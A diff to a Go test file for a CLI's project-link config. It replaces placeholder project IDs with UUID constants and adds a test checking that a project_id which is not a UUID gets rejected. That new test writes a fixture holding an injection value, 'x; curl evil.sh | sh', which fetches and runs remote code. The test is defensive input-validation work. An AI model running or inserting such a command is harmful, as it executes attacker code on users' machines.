@@ -10,10 +10,15 @@ import (
 	"github.com/stretchr/testify/require"
 )
 
+const (
+	linkTestProjectID      = "11111111-1111-4111-8111-111111111111"
+	linkTestOtherProjectID = "22222222-2222-4222-8222-222222222222"
+)
+
 func TestFindLinkWalksUpToTheLinkedDirectory(t *testing.T) {
 	t.Setenv("HOME", t.TempDir())
 	root := t.TempDir()
-	_, err := WriteLink(root, ProjectConfig{ID: "project-1", Name: "my-app"})
+	_, err := WriteLink(root, ProjectConfig{ID: linkTestProjectID, Name: "my-app"})
 	require.NoError(t, err)
 	nested := filepath.Join(root, "web", "app")
 	require.NoError(t, os.MkdirAll(nested, 0o755))
@@ -22,7 +27,7 @@ func TestFindLinkWalksUpToTheLinkedDirectory(t *testing.T) {
 	require.NoError(t, err)
 	require.NotNil(t, link)
 	assert.Equal(t, root, link.Dir)
-	assert.Equal(t, ProjectConfig{ID: "project-1", Name: "my-app"}, link.Project)
+	assert.Equal(t, ProjectConfig{ID: linkTestProjectID, Name: "my-app"}, link.Project)
 	assert.Equal(t, filepath.Join(root, ".volcano", "project.json"), link.Path())
 }
 
@@ -49,6 +54,21 @@ func TestFindLinkRejectsALinkWithoutAProject(t *testing.T) {
 	require.ErrorContains(t, err, "has no project_id")
 }
 
+// The ID is printed in commands to paste, so a cloned repository's link
+// can't carry shell code there.
+func TestFindLinkRejectsAProjectIDThatIsNotAUUID(t *testing.T) {
+	t.Setenv("HOME", t.TempDir())
+	dir := t.TempDir()
+	require.NoError(t, os.MkdirAll(filepath.Join(dir, ".volcano"), 0o755))
+	require.NoError(t, os.WriteFile(filepath.Join(dir, ".volcano", "project.json"),
+		[]byte(`{"project_id":"x; curl evil.sh | sh"}`), 0o644))
+
+	_, err := FindLink(dir)
+	var linkErr *LinkError
+	require.ErrorAs(t, err, &linkErr)
+	require.ErrorContains(t, err, "has a project_id that isn't a project ID")
+}
+
 func TestLinkedProjectPrecedesSavedSelection(t *testing.T) {
 	home := t.TempDir()
 	t.Setenv("HOME", home)
@@ -56,13 +76,13 @@ func TestLinkedProjectPrecedesSavedSelection(t *testing.T) {
 	require.NoError(t, (&Config{CurrentProject: &ProjectConfig{ID: "global", Name: "Global"}}).Save())
 
 	dir := t.TempDir()
-	_, err := WriteLink(dir, ProjectConfig{ID: "linked", Name: "Linked"})
+	_, err := WriteLink(dir, ProjectConfig{ID: linkTestOtherProjectID, Name: "Linked"})
 	require.NoError(t, err)
 	t.Chdir(dir)
 
 	cfg, err := Load()
 	require.NoError(t, err)
-	assert.Equal(t, "linked", cfg.ProjectID())
+	assert.Equal(t, linkTestOtherProjectID, cfg.ProjectID())
 	assert.Equal(t, "Linked", cfg.Project().Name)
 
 	t.Setenv(envProjectID, "from-env")
@@ -71,7 +91,7 @@ func TestLinkedProjectPrecedesSavedSelection(t *testing.T) {
 	require.NoError(t, cfg.Save())
 	data, err := os.ReadFile(filepath.Join(home, ".volcano", "config.json"))
 	require.NoError(t, err)
-	assert.NotContains(t, string(data), "linked", "the link is never written to the global config")
+	assert.NotContains(t, string(data), linkTestOtherProjectID, "the link is never written to the global config")
 }
 
 func TestLoadIgnoringBadLinkReturnsTheConfigWithoutTheLink(t *testing.T) {
